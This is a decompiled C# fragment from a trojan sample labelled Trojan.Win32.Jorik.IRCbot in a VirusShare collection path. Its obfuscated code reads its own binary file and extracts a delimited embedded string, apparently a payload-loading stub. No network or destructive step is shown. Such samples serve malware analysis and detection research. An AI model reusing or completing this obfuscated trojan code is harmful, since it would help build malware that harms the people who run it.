// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Refx, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0A6501CE-651B-49EF-9CD4-6837233ABDB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.Win32.Jorik.IRCbot.div-738c3979666da85c3c9872a05697e6bff01b107645b92c3a808be0f2a7bf41a4.exe

using \u0003;
using \u0005;
using \u007F;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace \u007F
{
  internal sealed class \u0084
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static string \u009E([In] ref string obj0)
    {
      string str1;
      try
      {
        int num1 = \u000F\u0003.\u001E();
        \u009A\u0002.\u001B(num1, obj0, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
        string str2 = \u0089\u0002.\u009D(checked ((int) \u008D\u0002.\u001F(num1)));
        \u0083\u0002.\u001D(num1, ref str2, -1L, false);
        int[] numArray = new int[1]{ num1 };
        \u008F\u0003.\u001C(numArray);
        \u0011\u0003 obj1 = \u0011\u0003.\u009A;
        string str3 = \u009E\u0002.\u009F(str2);
        object obj2 = (object) 30;
        string str4 = \u0084.\u009F(ref obj2);
        int num2 = obj1(1, str3, str4, CompareMethod.Binary);
        string str5 = \u0010\u0002.\u0002\u0002(\u009E\u0002.\u009F(str2), 1, checked (num2 - 1));
        str1 = \u009E\u0002.\u009F(str5);
        if (\u008A\u0003.\u008E(str1, \u0084.\u0001(132), false) != 0)
          ;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        int num = (int) \u0084\u0003.\u0095((object) \u0086\u0002.\u007E\u0093\u0002((object) exception), MsgBoxStyle.OkOnly, (object) null);
        str1 = (string) null;
        \u0012\u0003.\u0090();
      }
      return str1;
    }

    public static string \u009F([In] ref object obj0)
    {
      string str = \u0084.\u0001(132);
      short num1 = \u0003\u0003.\u007F(obj0);
      short num2 = 1;
      while ((int) num2 <= (int) num1)
      {
        str = \u008B\u0003.\u008A\u0002(str, \u0084.\u0001(1420));
        checked { ++num2; }
      }
      return str;
    }

    static \u0084() => \u0004.\u008E();
  }
}
